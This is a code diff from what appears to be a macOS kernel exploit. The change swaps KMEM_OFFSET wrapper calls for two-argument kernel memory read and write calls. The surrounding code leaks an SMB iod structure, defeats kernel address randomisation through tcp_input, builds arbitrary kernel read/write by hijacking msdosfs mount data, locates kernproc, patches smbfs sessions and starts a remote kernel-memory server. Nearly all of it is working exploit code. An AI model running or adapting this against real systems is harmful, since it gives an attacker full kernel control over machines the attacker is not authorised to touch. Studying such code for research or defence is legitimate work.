@@ -102,37 +102,37 @@ ushort find_lport_for_fport(int server_pid, ushort fport) {
 
 
 void patch_smb_iod(xe_slider_kext_t smbfs_slider, uintptr_t iod) {
-    uintptr_t gss = KMEM_OFFSET(iod, offsetof(struct smbiod, iod_gss));
-    xe_kmem_write_uint32(KMEM_OFFSET(gss, offsetof(struct smb_gss, gss_spn_len)), 0);
-    xe_kmem_write_uint64(KMEM_OFFSET(gss, offsetof(struct smb_gss, gss_spn)), 0);
-    xe_kmem_write_uint32(KMEM_OFFSET(gss, offsetof(struct smb_gss, gss_cpn_len)), 0);
-    xe_kmem_write_uint64(KMEM_OFFSET(gss, offsetof(struct smb_gss, gss_cpn)), 0);
+    uintptr_t gss = iod + offsetof(struct smbiod, iod_gss);
+    xe_kmem_write_uint32(gss, offsetof(struct smb_gss, gss_spn_len), 0);
+    xe_kmem_write_uint64(gss, offsetof(struct smb_gss, gss_spn), 0);
+    xe_kmem_write_uint32(gss, offsetof(struct smb_gss, gss_cpn_len), 0);
+    xe_kmem_write_uint64(gss, offsetof(struct smb_gss, gss_cpn), 0);
 }
 
 
 void patch_session_interface_table(xe_slider_kext_t smbfs_slider, uintptr_t table) {
-    xe_kmem_write_uint32(KMEM_OFFSET(table, XE_SMB_TYPE_SESSION_INTERFACE_INFO_MEM_CLIENT_NIC_COUNT_OFFSET), 0);
-    xe_kmem_write_uint64(KMEM_OFFSET(table, XE_SMB_TYPE_SESSION_INTERFACE_INFO_MEM_CLIENT_NIC_INFO_LIST_OFFSET), 0);
+    xe_kmem_write_uint32(table, XE_SMB_TYPE_SESSION_INTERFACE_INFO_MEM_CLIENT_NIC_COUNT_OFFSET, 0);
+    xe_kmem_write_uint64(table, XE_SMB_TYPE_SESSION_INTERFACE_INFO_MEM_CLIENT_NIC_INFO_LIST_OFFSET, 0);
 }
 
 
 void patch_smb_session(xe_slider_kext_t smbfs_slider, uintptr_t session) {
-    uintptr_t iod = xe_kmem_read_uint64(KMEM_OFFSET(session, XE_SMB_TYPE_SMB_SESSION_MEM_SESSION_IOD_OFFSET));
+    uintptr_t iod = xe_kmem_read_uint64(session, XE_SMB_TYPE_SMB_SESSION_MEM_SESSION_IOD_OFFSET);
     if (iod) {
         patch_smb_iod(smbfs_slider, iod);
     }
-    uintptr_t session_interface_table = KMEM_OFFSET(session, XE_SMB_TYPE_SMB_SESSION_MEM_SESSION_INTERFACE_TABLE_OFFSET);
+    uintptr_t session_interface_table = session + XE_SMB_TYPE_SMB_SESSION_MEM_SESSION_INTERFACE_TABLE_OFFSET;
     patch_session_interface_table(smbfs_slider, session_interface_table);
 }
 
 
 void patch_smb_sessions(xe_slider_kext_t smbfs_slider) {
     uintptr_t smb_session_list = xe_slider_kext_slide(smbfs_slider, XE_KEXT_SEGMENT_DATA, XE_SMB_VAR_SMB_SESSION_LIST_OFFSET_DATA);
-    uintptr_t cursor = xe_kmem_read_uint64(KMEM_OFFSET(smb_session_list, XE_SMB_TYPE_SMB_CONNOBJ_MEM_CO_CHILDREN_OFFSET));
+    uintptr_t cursor = xe_kmem_read_uint64(smb_session_list, XE_SMB_TYPE_SMB_CONNOBJ_MEM_CO_CHILDREN_OFFSET);
     while (cursor != 0) {
         xe_assert(XE_VM_KERNEL_ADDRESS_VALID(cursor));
         patch_smb_session(smbfs_slider, cursor);
-        cursor = xe_kmem_read_uint64(KMEM_OFFSET(cursor, XE_SMB_TYPE_SMB_CONNOBJ_MEM_CO_NEXT_OFFSET));
+        cursor = xe_kmem_read_uint64(cursor, XE_SMB_TYPE_SMB_CONNOBJ_MEM_CO_NEXT_OFFSET);
     }
 }
 
@@ -353,10 +353,10 @@ int main(void) {
     
     xe_log_info("begin initializing kernel address slider");
     struct nbpcb nbpcb;
-    xe_kmem_read(&nbpcb, (uintptr_t)leaked_smbiod->iod_tdata, sizeof(nbpcb));
+    xe_kmem_read(&nbpcb, (uintptr_t)leaked_smbiod->iod_tdata, 0, sizeof(nbpcb));
     uintptr_t socket = (uintptr_t)nbpcb.nbp_tso;
-    uintptr_t protosw = xe_kmem_read_uint64(KMEM_OFFSET(socket, TYPE_SOCKET_MEM_SO_PROTO_OFFSET));
-    uintptr_t tcp_input = xe_ptrauth_strip(xe_kmem_read_uint64(KMEM_OFFSET(protosw, TYPE_PROTOSW_MEM_PR_INPUT_OFFSET)));
+    uintptr_t protosw = xe_kmem_read_uint64(socket, TYPE_SOCKET_MEM_SO_PROTO_OFFSET);
+    uintptr_t tcp_input = xe_ptrauth_strip(xe_kmem_read_uint64(protosw, TYPE_PROTOSW_MEM_PR_INPUT_OFFSET));
     xe_log_debug("found tcp_input function address: %p", (void*)tcp_input);
     
     int64_t text_exec_slide = tcp_input - FUNC_TCP_INPUT_ADDR;
@@ -417,25 +417,25 @@ int main(void) {
     uintptr_t vnode_mount_helper = xe_xnu_proc_find_fd_data_from_ofiles(fdesc_ofiles, fd_mount_helper);
     xe_log_debug("vnode mount helper address: %p", (void*)vnode_mount_helper);
     
-    uintptr_t mount_worker = xe_ptrauth_strip(xe_kmem_read_uint64(KMEM_OFFSET(vnode_mount_worker, TYPE_VNODE_MEM_VN_UN_OFFSET)));
+    uintptr_t mount_worker = xe_ptrauth_strip(xe_kmem_read_uint64(vnode_mount_worker, TYPE_VNODE_MEM_VN_UN_OFFSET));
     xe_log_debug("mount worker address: %p", (void*)mount_worker);
     
-    uintptr_t mount_helper = xe_ptrauth_strip(xe_kmem_read_uint64(KMEM_OFFSET(vnode_mount_helper, TYPE_VNODE_MEM_VN_UN_OFFSET)));
+    uintptr_t mount_helper = xe_ptrauth_strip(xe_kmem_read_uint64(vnode_mount_helper, TYPE_VNODE_MEM_VN_UN_OFFSET));
     xe_log_debug("mount helper address: %p", (void*)mount_helper);
     
-    uintptr_t msdosfs_worker = xe_kmem_read_uint64(KMEM_OFFSET(mount_worker, TYPE_MOUNT_MEM_MNT_DATA_OFFSET));
+    uintptr_t msdosfs_worker = xe_kmem_read_uint64(mount_worker, TYPE_MOUNT_MEM_MNT_DATA_OFFSET);
     xe_log_debug("msdosfsmount worker address: %p", (void*)msdosfs_worker);
     
-    uintptr_t msdosfs_helper = xe_kmem_read_uint64(KMEM_OFFSET(mount_helper, TYPE_MOUNT_MEM_MNT_DATA_OFFSET));
+    uintptr_t msdosfs_helper = xe_kmem_read_uint64(mount_helper, TYPE_MOUNT_MEM_MNT_DATA_OFFSET);
     xe_log_debug("msdosfsmount helper address: %p", (void*)msdosfs_helper);
     
     char backup_worker[368];
-    xe_kmem_read(backup_worker, msdosfs_worker, sizeof(backup_worker));
+    xe_kmem_read(backup_worker, msdosfs_worker, 0, sizeof(backup_worker));
     
     xe_log_debug_hexdump(backup_worker, sizeof(backup_worker), "msdosfsmount worker:");
     
     char backup_helper[368];
-    xe_kmem_read(backup_helper, msdosfs_helper, sizeof(backup_helper));
+    xe_kmem_read(backup_helper, msdosfs_helper, 0, sizeof(backup_helper));
     xe_log_debug_hexdump(backup_helper, sizeof(backup_helper), "msdosfsmount helper:");
     
     uintptr_t vnode_worker_bridge = xe_xnu_proc_find_fd_data_from_ofiles(fdesc_ofiles, worker_bridge_fd);
@@ -482,7 +482,7 @@ int main(void) {
     args.helper_mutator_ctx = NULL;
     
     xe_kmem_use_backend(xe_kmem_msdosfs_create(&args));
-    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_KERNPROC_ADDR));
+    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_KERNPROC_ADDR), 0);
     xe_assert_kaddr(kernproc);
     xe_log_info("done initializing fast msdosfsmount based kmem read writer");
     
@@ -491,11 +491,11 @@ int main(void) {
     error = xe_xnu_proc_find_fd_data(proc, fd_mount_decoy, &vnode_mount_decoy);
     xe_assert_err(error);
     
-    uintptr_t mount_decoy = xe_ptrauth_strip(xe_kmem_read_uint64(KMEM_OFFSET(vnode_mount_decoy, TYPE_VNODE_MEM_VN_UN_OFFSET)));
-    uintptr_t msdosfs_decoy = xe_kmem_read_uint64(KMEM_OFFSET(mount_decoy, TYPE_MOUNT_MEM_MNT_DATA_OFFSET));
+    uintptr_t mount_decoy = xe_ptrauth_strip(xe_kmem_read_uint64(vnode_mount_decoy, TYPE_VNODE_MEM_VN_UN_OFFSET));
+    uintptr_t msdosfs_decoy = xe_kmem_read_uint64(mount_decoy, TYPE_MOUNT_MEM_MNT_DATA_OFFSET);
     
-    xe_kmem_write_uint64(KMEM_OFFSET(mount_helper, TYPE_MOUNT_MEM_MNT_DATA_OFFSET), msdosfs_decoy);
-    xe_kmem_write_uint64(KMEM_OFFSET(mount_worker, TYPE_MOUNT_MEM_MNT_DATA_OFFSET), msdosfs_decoy);
+    xe_kmem_write_uint64(mount_helper, TYPE_MOUNT_MEM_MNT_DATA_OFFSET, msdosfs_decoy);
+    xe_kmem_write_uint64(mount_worker, TYPE_MOUNT_MEM_MNT_DATA_OFFSET, msdosfs_decoy);
     xe_log_info("disabled FS ops on helper and worker mounts");
     
     xe_slider_kext_t smbfs_slider = xe_slider_kext_create("com.apple.filesystems.smbfs", XE_KC_BOOT);
@@ -512,8 +512,8 @@ int main(void) {
     xe_kmem_remote_server_start(&server_ctx);
     
     xe_log_info("restoring FS ops on helper and worker mounts");
-    xe_kmem_write_uint64(KMEM_OFFSET(mount_helper, TYPE_MOUNT_MEM_MNT_DATA_OFFSET), msdosfs_helper);
-    xe_kmem_write_uint64(KMEM_OFFSET(mount_worker, TYPE_MOUNT_MEM_MNT_DATA_OFFSET), msdosfs_worker);
+    xe_kmem_write_uint64(mount_helper, TYPE_MOUNT_MEM_MNT_DATA_OFFSET, msdosfs_helper);
+    xe_kmem_write_uint64(mount_worker, TYPE_MOUNT_MEM_MNT_DATA_OFFSET, msdosfs_worker);
     xe_log_info("restored FS ops on helper and worker mounts");
     
     return 0;
